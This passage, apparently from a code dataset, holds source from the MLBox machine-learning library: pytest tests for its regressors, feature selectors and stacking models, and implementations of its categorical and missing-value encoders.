    assert feature_selector._Reg_feature_selector__fitOK
    feature_selector.set_params(strategy='variance')
    feature_selector.fit(df_train, y_train)
    assert feature_selector._Reg_feature_selector__fitOK
    feature_selector.set_params(strategy='rf_feature_importance')
    feature_selector.fit(df_train, y_train)
    assert feature_selector._Reg_feature_selector__fitOK
    feature_selector.set_params(strategy='wrond_strategy')
    with pytest.raises(ValueError):
        feature_selector.fit(df_train, y_train)"
AxeldeRomblay/MLBox,test_transform_Reg_feature_selector,"def test_transform_Reg_feature_selector():
    """"""Test transform method of Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector(threshold=0)
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    with pytest.raises(ValueError):
        feature_selector.transform(df_train)
    feature_selector.fit(df_train, y_train)
    with pytest.raises(ValueError):
        feature_selector.transform(None)
    df_transformed = feature_selector.transform(df_train)
    assert (df_transformed.columns == df_train.columns).all()"
AxeldeRomblay/MLBox,test_fit_transform_Reg_feature_selector,"def test_fit_transform_Reg_feature_selector():
    """"""Test fit_transform method of Reg_feature_selector class.""""""
    feature_selector = Reg_feature_selector(threshold=0)
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_transformed = feature_selector.fit_transform(df_train, y_train)
    assert (df_transformed.columns == df_train.columns).all()"
AxeldeRomblay/MLBox,test_init_regressor,"def test_init_regressor():
    """"""Test init method of Regressor class.""""""
    regressor = Regressor()
    assert regressor._Regressor__strategy == 'LightGBM'
    assert regressor._Regressor__regress_params == {}
    assert regressor._Regressor__regressor
    assert not regressor._Regressor__col
    assert not regressor._Regressor__fitOK"
AxeldeRomblay/MLBox,test_get_params_regressor,"def test_get_params_regressor():
    """"""Test get_params method of Regressor class.""""""
    regressor = Regressor()
    params = regressor.get_params()
    assert params == {'strategy': 'LightGBM'}
    assert not regressor._Regressor__regress_params"
AxeldeRomblay/MLBox,test_set_params_regressor,"def test_set_params_regressor():
    """"""Test set_params method of Regressor class.""""""
    regressor = Regressor()
    regressor.set_params(strategy='LightGBM')
    assert regressor._Regressor__strategy == 'LightGBM'
    regressor.set_params(strategy='RandomForest')
    assert regressor._Regressor__strategy == 'RandomForest'
    regressor.set_params(strategy='ExtraTrees')
    assert regressor._Regressor__strategy == 'ExtraTrees'
    regressor.set_params(strategy='RandomForest')
    assert regressor._Regressor__strategy == 'RandomForest'
    regressor.set_params(strategy='Tree')
    assert regressor._Regressor__strategy == 'Tree'
    regressor.set_params(strategy='AdaBoost')
    assert regressor._Regressor__strategy == 'AdaBoost'
    regressor.set_params(strategy='Linear')
    assert regressor._Regressor__strategy == 'Linear'
    regressor.set_params(strategy='Bagging')
    assert regressor._Regressor__strategy == 'Bagging'
    with pytest.warns(UserWarning) as record:
        regressor.set_params(wrong_strategy='wrong_strategy')
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_set_regressor,"def test_set_regressor():
    """"""Test set method of Regressor class.""""""
    regressor = Regressor()
    with pytest.raises(ValueError):
        regressor._Regressor__set_regressor('wrong_strategy')"
AxeldeRomblay/MLBox,test_fit_regressor,"def test_fit_regressor():
    """"""Test fit method of Regressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    regressor = Regressor()
    regressor.fit(df_train, y_train)
    assert np.all(regressor._Regressor__col == df_train.columns)
    assert regressor._Regressor__fitOK"
AxeldeRomblay/MLBox,test_feature_importances_regressor,"def test_feature_importances_regressor():
    """"""Test feature_importances of Regressor class.""""""
    regressor = Regressor()
    with pytest.raises(ValueError):
        regressor.feature_importances()
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    regressor.set_params(strategy='LightGBM')
    regressor.fit(df_train, y_train)
    importance = regressor.feature_importances()
    assert importance != {}
    regressor.set_params(strategy='Linear')
    regressor.fit(df_train, y_train)
    importance = regressor.feature_importances()
    assert importance != {}
    regressor.set_params(strategy='RandomForest')
    regressor.fit(df_train, y_train)
    importance = regressor.feature_importances()
    assert importance != {}
    regressor.set_params(strategy='AdaBoost')
    regressor.fit(df_train, y_train)
    importance = regressor.feature_importances()
    assert importance != {}
    regressor.set_params(strategy='Bagging')
    regressor.fit(df_train, y_train)
    importance = regressor.feature_importances()
    assert importance != {}"
AxeldeRomblay/MLBox,test_predict_regressor,"def test_predict_regressor():
    """"""Test predict method of Regressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    regressor = Regressor()
    with pytest.raises(ValueError):
        regressor.predict(df_train)
    regressor.fit(df_train, y_train)
    with pytest.raises(ValueError):
        regressor.predict(None)
    assert len(regressor.predict(df_train)) > 0"
AxeldeRomblay/MLBox,test_score_regressor,"def test_score_regressor():
    """"""Test_score method of Regressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    regressor = Regressor(strategy='Linear')
    with pytest.raises(ValueError):
        regressor.score(df_train, y_train)
    regressor.fit(df_train, y_train)
    with pytest.raises(ValueError):
        regressor.score(None, y_train)
    with pytest.raises(ValueError):
        regressor.score(df_train, None)
    assert regressor.score(df_train, y_train) > 0"
AxeldeRomblay/MLBox,test_get_estimator_regressor,"def test_get_estimator_regressor():
    """"""Test get_estimator of Regressor class.""""""
    regressor = Regressor()
    estimator = regressor.get_estimator()
    assert isinstance(estimator, type(LGBMRegressor()))"
AxeldeRomblay/MLBox,test_init_stacking_classifier,"def test_init_stacking_classifier():
    """"""Test init method of StackingClassifier class.""""""
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(base_estimators=dict())
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(n_folds=dict())
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(copy='True')
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(drop_first='True')
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(random_state='1')
    with pytest.raises(ValueError):
        stacking_classifier = StackingClassifier(verbose='True')
    stacking_classifier = StackingClassifier()
    assert len(stacking_classifier.base_estimators) == 3
    assert isinstance(stacking_classifier.level_estimator, type(LogisticRegression()))
    assert stacking_classifier.n_folds == 5
    assert not stacking_classifier.copy
    assert stacking_classifier.drop_first
    assert stacking_classifier.random_state == 1
    assert stacking_classifier.verbose
    assert not stacking_classifier._StackingClassifier__fitOK
    assert not stacking_classifier._StackingClassifier__fittransformOK"
AxeldeRomblay/MLBox,test_get_params_stacking_classifier,"def test_get_params_stacking_classifier():
    """"""Test get_params method StackingClassifier class.""""""
    stacking_classifier = StackingClassifier()
    dict = stacking_classifier.get_params()
    assert len(dict['base_estimators']) == 3
    assert isinstance(dict['level_estimator'], type(LogisticRegression()))
    assert dict['n_folds'] == 5
    assert not dict['copy']
    assert dict['drop_first']
    assert dict['random_state'] == 1
    assert dict['verbose']"
AxeldeRomblay/MLBox,test_set_params_stacking_classifier,"def test_set_params_stacking_classifier():
    """"""Test set_params method of StackingClassifier class.""""""
    stacking_classifier = StackingClassifier()
    stacking_classifier.set_params(n_folds=6)
    assert stacking_classifier.n_folds == 6
    stacking_classifier.set_params(copy=True)
    assert stacking_classifier.copy
    stacking_classifier.set_params(drop_first=False)
    assert not stacking_classifier.drop_first
    stacking_classifier.set_params(random_state=2)
    assert stacking_classifier.random_state == 2
    stacking_classifier.set_params(verbose=False)
    assert not stacking_classifier.verbose
    with pytest.warns(UserWarning) as record:
        stacking_classifier.set_params(wrong_parameters=None)
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_transform_stacking_classifier,"def test_fit_transform_stacking_classifier():
    """"""Test fit_transform method of StackingClassifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    stacking_classifier = StackingClassifier()
    with pytest.raises(ValueError):
        stacking_classifier.fit_transform(None, y_train)
    with pytest.raises(ValueError):
        stacking_classifier.fit_transform(df_train, None)
    stacking_classifier.fit_transform(df_train, y_train)
    assert stacking_classifier._StackingClassifier__fittransformOK"
AxeldeRomblay/MLBox,test_transform_stacking_classifier,"def test_transform_stacking_classifier():
    """"""Test transform method of StackingClassifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    stacking_classifier = StackingClassifier()
    with pytest.raises(ValueError):
        stacking_classifier.transform(None)
    with pytest.raises(ValueError):
        stacking_classifier.transform(df_test)
    stacking_classifier.fit_transform(df_train, y_train)
    results = stacking_classifier.transform(df_test)
    assert len(results.columns == 3)"
AxeldeRomblay/MLBox,test_fit_stacking_classifier,"def test_fit_stacking_classifier():
    """"""Test fit method of StackingClassifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    stacking_classifier = StackingClassifier(verbose=True)
    stacking_classifier.fit(df_train, y_train)
    assert stacking_classifier._StackingClassifier__fitOK"
AxeldeRomblay/MLBox,test_predict_proba_stacking_classifier,"def test_predict_proba_stacking_classifier():
    """"""Test predict_proba method of StackingClassifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    stacking_classifier = StackingClassifier()
    with pytest.raises(ValueError):
        stacking_classifier.predict_proba(df_test)
    stacking_classifier.fit(df_train, y_train)
    results = stacking_classifier.predict_proba(df_test)
    assert np.shape(results) == (418, 2)"
AxeldeRomblay/MLBox,test_predict_stacking_classifier,"def test_predict_stacking_classifier():
    """"""Test predict method of StackingClassifier class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    stacking_classifier = StackingClassifier()
    with pytest.raises(ValueError):
        stacking_classifier.predict(df_test)
    stacking_classifier.fit(df_train, y_train)
    results = stacking_classifier.predict(df_test)
    assert np.shape(results) == (418,)"
AxeldeRomblay/MLBox,test_init_stacking_regressor,"def test_init_stacking_regressor():
    """"""Test init method of StackingRegressor class.""""""
    with pytest.raises(ValueError):
        stacking_regressor = StackingRegressor(base_estimators=dict())
    with pytest.raises(ValueError):
        stacking_regressor = StackingRegressor(n_folds=dict())
    with pytest.raises(ValueError):
        stacking_regressor = StackingRegressor(copy='True')
    with pytest.raises(ValueError):
        stacking_regressor = StackingRegressor(random_state='1')
    with pytest.raises(ValueError):
        stacking_regressor = StackingRegressor(verbose='True')
    stacking_regressor = StackingRegressor()
    assert len(stacking_regressor.base_estimators) == 3
    assert isinstance(stacking_regressor.level_estimator, type(LinearRegression()))
    assert stacking_regressor.n_folds == 5
    assert not stacking_regressor.copy
    assert stacking_regressor.random_state == 1
    assert stacking_regressor.verbose
    assert not stacking_regressor._StackingRegressor__fitOK
    assert not stacking_regressor._StackingRegressor__fittransformOK"
AxeldeRomblay/MLBox,test_get_params_stacking_regressor,"def test_get_params_stacking_regressor():
    """"""Test get_params method of StackingRegressor class.""""""
    stacking_regressor = StackingRegressor()
    dict = stacking_regressor.get_params()
    assert len(dict['base_estimators']) == 3
    assert isinstance(dict['level_estimator'], type(LinearRegression()))
    assert dict['n_folds'] == 5
    assert not dict['copy']
    assert dict['random_state'] == 1
    assert dict['verbose']"
AxeldeRomblay/MLBox,test_set_params_stacking_regressor,"def test_set_params_stacking_regressor():
    """"""Test set_params method of StackingRegressor class.""""""
    stacking_regressor = StackingRegressor()
    stacking_regressor.set_params(n_folds=6)
    assert stacking_regressor.n_folds == 6
    stacking_regressor.set_params(copy=True)
    assert stacking_regressor.copy
    stacking_regressor.set_params(random_state=2)
    assert stacking_regressor.random_state == 2
    stacking_regressor.set_params(verbose=False)
    assert not stacking_regressor.verbose
    with pytest.warns(UserWarning) as record:
        stacking_regressor.set_params(wrong_parameters=None)
    assert len(record) == 1"
AxeldeRomblay/MLBox,test_fit_transform_stacking_regressor,"def test_fit_transform_stacking_regressor():
    """"""Test fit_transform method of Stacking regressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    stacking_regressor = StackingRegressor()
    with pytest.raises(ValueError):
        stacking_regressor.fit_transform(None, y_train)
    with pytest.raises(ValueError):
        stacking_regressor.fit_transform(df_train, None)
    stacking_regressor.fit_transform(df_train, y_train)
    assert stacking_regressor._StackingRegressor__fittransformOK"
AxeldeRomblay/MLBox,test_transform_stacking_regressor,"def test_transform_stacking_regressor():
    """"""Test transform method of StackingRegressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    stacking_regressor = StackingRegressor()
    with pytest.raises(ValueError):
        stacking_regressor.transform(None)
    with pytest.raises(ValueError):
        stacking_regressor.transform(df_test)
    stacking_regressor.fit_transform(df_train, y_train)
    results = stacking_regressor.transform(df_test)
    assert len(results.columns == 3)"
AxeldeRomblay/MLBox,test_fit_stacking_regressor,"def test_fit_stacking_regressor():
    """"""Test fit method of StackingRegressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    stacking_regressor = StackingRegressor(verbose=True)
    stacking_regressor.fit(df_train, y_train)
    assert stacking_regressor._StackingRegressor__fitOK"
AxeldeRomblay/MLBox,test_predict_stacking_regressor,"def test_predict_stacking_regressor():
    """"""Test predict method of StackingRegressor class.""""""
    df_train = pd.read_csv('data_for_tests/clean_train.csv')
    y_train = pd.read_csv('data_for_tests/clean_target.csv', squeeze=True)
    df_test = pd.read_csv('data_for_tests/clean_test.csv')
    stacking_regressor = StackingRegressor()
    with pytest.raises(ValueError):
        stacking_regressor.predict(df_test)
    stacking_regressor.fit(df_train, y_train)
    results = stacking_regressor.predict(df_test)
    assert np.shape(results) == (418,)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, strategy='label_encoding', verbose=False):
    """"""Init method for class Categorical_encoder().""""""
    self.strategy = strategy
    self.verbose = verbose
    self.__Lcat = []
    self.__Lnum = []
    self.__Enc = dict()
    self.__K = dict()
    self.__weights = None
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    """"""Get param that can be defined by the user.

        Get strategy parameters and verbose parameters

        Parameters
        ----------
        strategy : str, default = ""label_encoding""
            The strategy to encode categorical features.
            Available strategies = {""label_encoding"", ""dummification"",
            ""random_projection"", entity_embedding""}
        verbose : bool, default = False
            Verbose mode. Useful for entity embedding strategy.

        Returns
        -------
        dict : dictionary
            Dictionary that contains strategy and verbose parameters.

        """"""
    dict = {'strategy': self.strategy, 'verbose': self.verbose}
    return dict"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set param method for Categorical encoder.

        Set strategy parameters and verbose parameters

        Parameters
        ----------
        strategy : str, default = ""label_encoding""
            The strategy to encode categorical features.
            Available strategies = {""label_encoding"", ""dummification"",
            ""random_projection"", entity_embedding""}
        verbose : bool, default = False
            Verbose mode. Useful for entity embedding strategy.

        """"""
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter(s) for encoder Categorical_encoder. Parameter(s) IGNORED. Check the list of available parameters with `encoder.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train):
    """"""Fit Categorical Encoder.

        Encode categorical variable of a dataframe
        following strategy parameters.

        Parameters
        ----------
        df_train : pandas.Dataframe of shape = (n_train, n_features).
            The training dataset with numerical and categorical features.
            NA values are allowed.
        y_train : pandas.Series of shape = (n_train, ).
            The target for classification or regression tasks.

        Returns
        -------
        object
            self

        """"""
    self.__Lcat = df_train.dtypes[df_train.dtypes == 'object'].index
    self.__Lnum = df_train.dtypes[df_train.dtypes != 'object'].index
    if len(self.__Lcat) == 0:
        self.__fitOK = True
    elif self.strategy == 'label_encoding':
        for col in self.__Lcat:
            d = dict()
            levels = list(df_train[col].unique())
            nan = False
            if np.NaN in levels:
                nan = True
                levels.remove(np.NaN)
            for (enc, level) in enumerate([np.NaN] * nan + sorted(levels)):
                d[level] = enc
            self.__Enc[col] = d
        self.__fitOK = True
    elif self.strategy == 'dummification':
        for col in self.__Lcat:
            self.__Enc[col] = list(df_train[col].dropna().unique())
        self.__fitOK = True
    elif self.strategy == 'entity_embedding':
        A = 10
        B = 5
        self.__K = {}
        for col in self.__Lcat:
            exp_ = np.exp(-df_train[col].nunique() * 0.05)
            self.__K[col] = np.int(5 * (1 - exp_) + 1)
        sum_ = sum([1.0 * np.log(k) for k in self.__K.values()])
        n_layer1 = min(1000, int(A * len(self.__K) ** 0.5 * sum_ + 1))
        n_layer2 = int(n_layer1 / B) + 2
        dropout1 = 0.1
        dropout2 = 0.1
        epochs = 20
        batch_size = 128
        embeddings = []
        inputs = []
        for col in self.__Lcat:
            d = dict()
            levels = list(df_train[col].unique())
            nan = False
            if np.NaN in levels:
                nan = True
                levels.remove(np.NaN)
            for (enc, level) in enumerate([np.NaN] * nan + sorted(levels)):
                d[level] = enc
            self.__Enc[col] = d
            var = Input(shape=(1,))
            inputs.append(var)
            emb = Embedding(input_dim=len(self.__Enc[col]), output_dim=self.__K[col], input_length=1)(var)
            emb = Reshape(target_shape=(self.__K[col],))(emb)
            embeddings.append(emb)
        if len(self.__Lcat) > 1:
            emb_layer = concatenate(embeddings)
        else:
            emb_layer = embeddings[0]
        lay1 = Dense(n_layer1, kernel_initializer='uniform', activation='relu')(emb_layer)
        lay1 = Dropout(dropout1)(lay1)
        lay2 = Dense(n_layer2, kernel_initializer='uniform', activation='relu')(lay1)
        lay2 = Dropout(dropout2)(lay2)
        if (y_train.dtype == object) | (y_train.dtype == 'int'):
            if y_train.nunique() == 2:
                outputs = Dense(1, kernel_initializer='normal', activation='sigmoid')(lay2)
                model = Model(inputs=inputs, outputs=outputs)
                model.compile(loss='binary_crossentropy', optimizer='adam')
                model.fit([df_train[col].apply(lambda x: self.__Enc[col][x]).values for col in self.__Lcat], pd.get_dummies(y_train, drop_first=True).astype(int).values, epochs=epochs, batch_size=batch_size, verbose=int(self.verbose))
            else:
                outputs = Dense(y_train.nunique(), kernel_initializer='normal', activation='softmax')(lay2)
                model = Model(inputs=inputs, outputs=outputs)
                model.compile(loss='binary_crossentropy', optimizer='adam')
                model.fit([df_train[col].apply(lambda x: self.__Enc[col][x]).values for col in self.__Lcat], pd.get_dummies(y_train, drop_first=False).astype(int).values, epochs=epochs, batch_size=batch_size, verbose=int(self.verbose))
        else:
            outputs = Dense(1, kernel_initializer='normal')(lay2)
            model = Model(inputs=inputs, outputs=outputs)
            model.compile(loss='mean_squared_error', optimizer='adam')
            model.fit([df_train[col].apply(lambda x: self.__Enc[col][x]).values for col in self.__Lcat], y_train.values, epochs=epochs, batch_size=batch_size, verbose=int(self.verbose))
        self.__weights = model.get_weights()
        self.__fitOK = True
    elif self.strategy == 'random_projection':
        for col in self.__Lcat:
            exp_ = np.exp(-df_train[col].nunique() * 0.05)
            self.__K[col] = np.int(5 * (1 - exp_)) + 1
            d = dict()
            levels = list(df_train[col].unique())
            nan = False
            if np.NaN in levels:
                nan = True
                levels.remove(np.NaN)
            for k in range(self.__K[col]):
                if k == 0:
                    levels = sorted(levels)
                else:
                    np.random.seed(k)
                    np.random.shuffle(levels)
                for (enc, level) in enumerate([np.NaN] * nan + levels):
                    if k == 0:
                        d[level] = [enc]
                    else:
                        d[level] = d[level] + [enc]
            self.__Enc[col] = d
        self.__fitOK = True
    else:
        raise ValueError('Categorical encoding strategy is not valid')
    return self"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train):
    """"""Fits Categorical Encoder and transforms the dataset.

        Fit categorical encoder following strategy parameter and transform the
        dataset df_train.

        Parameters
        ----------
        df_train : pandas.Dataframe of shape = (n_train, n_features)
            The training dataset with numerical and categorical features.
            NA values are allowed.
        y_train : pandas.Series of shape = (n_train, ).
            The target for classification or regression tasks.

        Returns
        -------
        pandas.Dataframe of shape = (n_train, n_features)
            Training dataset with numerical and encoded categorical features.

        """"""
    self.fit(df_train, y_train)
    return self.transform(df_train)"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Transform categorical variable of df dataset.

        Transform df DataFrame encoding categorical features with the strategy
        parameter if self.__fitOK is set to True.

        Parameters
        ----------
        df : pandas.Dataframe of shape = (n_train, n_features)
            The training dataset with numerical and categorical features.
            NA values are allowed.

        Returns
        -------
        pandas.Dataframe of shape = (n_train, n_features)
            The dataset with numerical and encoded categorical features.

        """"""
    if self.__fitOK:
        if len(self.__Lcat) == 0:
            return df[self.__Lnum]
        elif self.strategy == 'label_encoding':
            for col in self.__Lcat:
                unknown_levels = list(set(df[col].values) - set(self.__Enc[col].keys()))
                if len(unknown_levels) != 0:
                    new_enc = len(self.__Enc[col])
                    for unknown_level in unknown_levels:
                        d = self.__Enc[col]
                        d[unknown_level] = new_enc
                        self.__Enc[col] = d
            if len(self.__Lnum) == 0:
                return pd.concat([pd.DataFrame(df[col].apply(lambda x: self.__Enc[col][x]).values, columns=[col], index=df.index) for col in self.__Lcat], axis=1)[df.columns]
            else:
                return pd.concat([df[self.__Lnum]] + [pd.DataFrame(df[col].apply(lambda x: self.__Enc[col][x]).values, columns=[col], index=df.index) for col in self.__Lcat], axis=1)[df.columns]
        elif self.strategy == 'dummification':
            sub_var = []
            missing_var = []
            for col in self.__Lcat:
                unique_levels = set(df[col].values)
                sub_levels = unique_levels & set(self.__Enc[col])
                missing_levels = [col + '_' + str(s) for s in list(set(self.__Enc[col]) - sub_levels)]
                sub_levels = [col + '_' + str(s) for s in list(sub_levels)]
                sub_var = sub_var + sub_levels
                missing_var = missing_var + missing_levels
            if len(missing_var) != 0:
                return pd.SparseDataFrame(pd.concat([pd.get_dummies(df, sparse=True)[list(self.__Lnum) + sub_var]] + [pd.DataFrame(np.zeros((df.shape[0], len(missing_var))), columns=missing_var, index=df.index)], axis=1)[list(self.__Lnum) + sorted(missing_var + sub_var)])
            else:
                return pd.get_dummies(df, sparse=True)[list(self.__Lnum) + sorted(sub_var)]
        elif self.strategy == 'entity_embedding':

            def get_embeddings(x, col, i):
                if int(self.__Enc[col][x]) < np.shape(self.__weights[i])[0]:
                    return self.__weights[i][int(self.__Enc[col][x]), :]
                return np.mean(self.__weights[i], axis=0)
            for col in self.__Lcat:
                unknown_levels = list(set(df[col].values) - set(self.__Enc[col].keys()))
                if len(unknown_levels) != 0:
                    new_enc = len(self.__Enc[col])
                    for unknown_level in unknown_levels:
                        d = self.__Enc[col]
                        d[unknown_level] = new_enc
                        self.__Enc[col] = d
            if len(self.__Lnum) == 0:
                return pd.concat([pd.DataFrame(df[col].apply(lambda x: get_embeddings(x, col, i)).tolist(), columns=[col + '_emb' + str(k + 1) for k in range(self.__K[col])], index=df.index) for (i, col) in enumerate(self.__Lcat)], axis=1)
            else:
                return pd.concat([df[self.__Lnum]] + [pd.DataFrame(df[col].apply(lambda x: get_embeddings(x, col, i)).tolist(), columns=[col + '_emb' + str(k + 1) for k in range(self.__K[col])], index=df.index) for (i, col) in enumerate(self.__Lcat)], axis=1)
        else:
            for col in self.__Lcat:
                unknown_levels = list(set(df[col].values) - set(self.__Enc[col].keys()))
                if len(unknown_levels) != 0:
                    new_enc = len(self.__Enc[col])
                    for unknown_level in unknown_levels:
                        d = self.__Enc[col]
                        d[unknown_level] = [new_enc for _ in range(self.__K[col])]
                        self.__Enc[col] = d
            if len(self.__Lnum) == 0:
                return pd.concat([pd.DataFrame(df[col].apply(lambda x: self.__Enc[col][x]).tolist(), columns=[col + '_proj' + str(k + 1) for k in range(self.__K[col])], index=df.index) for col in self.__Lcat], axis=1)
            else:
                return pd.concat([df[self.__Lnum]] + [pd.DataFrame(df[col].apply(lambda x: self.__Enc[col][x]).tolist(), columns=[col + '_proj' + str(k + 1) for k in range(self.__K[col])], index=df.index) for col in self.__Lcat], axis=1)
    else:
        raise ValueError('Call fit or fit_transform function before')"
AxeldeRomblay/MLBox,get_embeddings,"def get_embeddings(x, col, i):
    if int(self.__Enc[col][x]) < np.shape(self.__weights[i])[0]:
        return self.__weights[i][int(self.__Enc[col][x]), :]
    return np.mean(self.__weights[i], axis=0)"
AxeldeRomblay/MLBox,__init__,"def __init__(self, numerical_strategy='mean', categorical_strategy='<NULL>'):
    """"""Init a NA_encoder.

        User can choose numerical strategy and categorical strategy.

        Parameters
        ----------
        numerical_strategy : str or float or int. default = ""mean""
            The strategy to encode NA for numerical features.

        categorical_strategy : str, default = '<NULL>'
            The strategy to encode NA for categorical features.

        """"""
    self.numerical_strategy = numerical_strategy
    self.categorical_strategy = categorical_strategy
    self.__Lcat = []
    self.__Lnum = []
    self.__imp = None
    self.__mode = dict()
    self.__fitOK = False"
AxeldeRomblay/MLBox,get_params,"def get_params(self, deep=True):
    """"""Get parameters of a NA_encoder object.""""""
    return {'numerical_strategy': self.numerical_strategy, 'categorical_strategy': self.categorical_strategy}"
AxeldeRomblay/MLBox,set_params,"def set_params(self, **params):
    """"""Set parameters for a NA_encoder object.

        Set numerical strategy and categorical strategy.

        Parameters
        ----------
        numerical_strategy : str or float or int. default = ""mean""
            The strategy to encode NA for numerical features.

        categorical_strategy : str, default = '<NULL>'
            The strategy to encode NA for categorical features.

        """"""
    self.__fitOK = False
    for (k, v) in params.items():
        if k not in self.get_params():
            warnings.warn('Invalid parameter(s) for encoder NA_encoder. Parameter(s) IGNORED. Check the list of available parameters with `encoder.get_params().keys()`')
        else:
            setattr(self, k, v)"
AxeldeRomblay/MLBox,fit,"def fit(self, df_train, y_train=None):
    """"""Fits NA Encoder.

        Parameters
        ----------
        df_train : pandas dataframe of shape = (n_train, n_features)
            The train dataset with numerical and categorical features.

        y_train : pandas series of shape = (n_train, ), default = None
            The target for classification or regression tasks.

        Returns
        -------
        object
            self

        """"""
    self.__Lcat = df_train.dtypes[df_train.dtypes == 'object'].index
    self.__Lnum = df_train.dtypes[df_train.dtypes != 'object'].index
    if self.numerical_strategy in ['mean', 'median', 'most_frequent']:
        self.__imp = SimpleImputer(strategy=self.numerical_strategy)
        if len(self.__Lnum) != 0:
            self.__imp.fit(df_train[self.__Lnum])
        else:
            pass
    elif (type(self.numerical_strategy) == int) | (type(self.numerical_strategy) == float):
        pass
    else:
        raise ValueError('Numerical strategy for NA encoding is not valid')
    if type(self.categorical_strategy) == str:
        if self.categorical_strategy == 'most_frequent':
            na_count = df_train[self.__Lcat].isnull().sum()
            for col in na_count[na_count > 0].index:
                try:
                    self.__mode[col] = df_train[col].mode()[0]
                except:
                    self.__mode[col] = '<NULL>'
        else:
            pass
    else:
        raise ValueError('Categorical strategy for NA encoding is not valid')
    self.__fitOK = True
    return self"
AxeldeRomblay/MLBox,fit_transform,"def fit_transform(self, df_train, y_train=None):
    """"""Fits NA Encoder and transforms the dataset.

        Parameters
        ----------
        df_train : pandas.Dataframe of shape = (n_train, n_features)
            The train dataset with numerical and categorical features.

        y_train : pandas.Series of shape = (n_train, ), default = None
            The target for classification or regression tasks.

        Returns
        -------
        pandas.Dataframe of shape = (n_train, n_features)
            The train dataset with no missing values.

        """"""
    self.fit(df_train, y_train)
    return self.transform(df_train)"
AxeldeRomblay/MLBox,transform,"def transform(self, df):
    """"""Transform the dataset.

        Parameters
        ----------
        df : pandas.Dataframe of shape = (n, n_features)
            The dataset with numerical and categorical features.

        Returns
        -------
        pandas.Dataframe of shape = (n, n_features)
            The dataset with no missing values.

        """"""
    if self.__fitOK:
        if len(self.__Lnum) == 0:
            if self.categorical_strategy != 'most_frequent':
                return df[self.__Lcat].fillna(self.categorical_strategy)
            else:
                return df[self.__Lcat].fillna(self.__mode)
        elif self.numerical_strategy in ['mean', 'median', 'most_frequent']:
            if len(self.__Lcat) != 0:
                if self.categorical_strategy != 'most_frequent':
                    return pd.concat((pd.DataFrame(self.__imp.transform(df[self.__Lnum]), columns=self.__Lnum, index=df.index), df[self.__Lcat].fillna(self.categorical_strategy)), axis=1)[df.columns]
                else:
                    return pd.concat((pd.DataFrame(self.__imp.transform(df[self.__Lnum]), columns=self.__Lnum, index=df.index), df[self.__Lcat].fillna(self.__mode)), axis=1)[df.columns]
            else:
                return pd.DataFrame(self.__imp.transform(df[self.__Lnum]), columns=self.__Lnum, index=df.index)
        elif (type(self.numerical_strategy) == int) | (type(self.numerical_strategy) == float):
            if len(self.__Lcat) != 0:
                if self.categorical_strategy != 'most_frequent':
                    return pd.concat((df[self.__Lnum].fillna(self.numerical_strategy), df[self.__Lcat].fillna(self.categorical_strategy)), axis=1)[df.columns]
                else:
                    return pd.concat((df[self.__Lnum].fillna(self.numerical_strategy), df[self.__Lcat].fillna(self.__mode)), axis=1)[df.columns]
            else:
                return df[self.__Lnum].fillna(self.numerical_strategy)
    else:
        raise ValueError('Call fit or fit_transform function before')"
AxeldeRomblay/MLBox,__init__,"def __init__(self, scoring=None, n_folds=2, random_state=1, to_path='save', verbose=True):
    self.scoring = scoring
    self.n_folds = n_folds
    self.random_state = random_state
    self.to_path = to_path
    self.verbose = verbose
